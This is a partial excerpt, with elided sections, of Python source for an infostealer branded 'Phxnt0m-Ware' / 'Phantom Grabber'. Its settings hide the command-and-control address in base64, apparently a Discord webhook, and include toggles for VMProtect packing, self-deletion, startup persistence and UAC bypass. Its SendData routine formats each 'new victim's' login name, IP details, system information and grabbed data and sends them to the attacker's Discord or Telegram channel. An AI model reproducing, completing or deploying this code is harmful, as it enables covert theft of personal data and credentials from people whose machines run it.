...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE0MzYyNTQ3NDI1MDExMzE0NC8zb0NSdUlKSEJ2a2RQNHg5eEdxQ3RZOXV3UEN0azlzbzQzVW9zUnlwS3FPNy1HVVNRN3lQOG1xYzFOS3ZWdmd4MkVyNA==').decode())
    Mutex = base64.b64decode('dHI4UHhlbFdLbTBJbGIyYg==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('cGFzc3dvcmQ=').decode()
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                ...
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Phxnt0m-Ware', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Phxnt0m1/Phxnt0mWare-Grabber', 'color': 16777215, 'footer': {'text': 'Grabbed by Phxnt0m-Ware | https://github.com/Phxnt0m1/Phxnt0mWare-Grabber'}, 'thumbnail': {'url': image_url1}}], 'username': 'Phxnt0m', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>Phantom Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
